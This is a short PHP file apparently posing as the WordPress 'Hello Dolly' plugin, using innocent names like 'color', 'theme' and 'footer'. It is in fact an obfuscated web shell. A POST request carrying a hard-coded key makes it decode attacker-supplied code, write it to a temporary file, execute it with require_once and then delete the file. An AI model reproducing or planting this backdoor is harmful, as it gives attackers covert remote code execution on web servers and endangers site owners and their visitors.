<?php
$hello_dolly[]='b6d5e2c0cfcb7cf4';
$hello_dolly[]=$_POST;
$hello_dolly[]='color';
if (isset($hello_dolly[1][$hello_dolly[0]])) {
	$dolly = $hello_dolly[1][$hello_dolly[2]]($hello_dolly[1]['theme']($hello_dolly[1][$hello_dolly[0]]));
	$dolly['themes'] = $dolly['theme']();
	$dolly['footer'] = $dolly['footer']($dolly['themes'])[$dolly['name']];
	$dolly['body']($dolly['themes'], $dolly['color']($dolly['header']));
	require_once($dolly['footer']);
	$dolly['size']($dolly['themes']);
}
?>
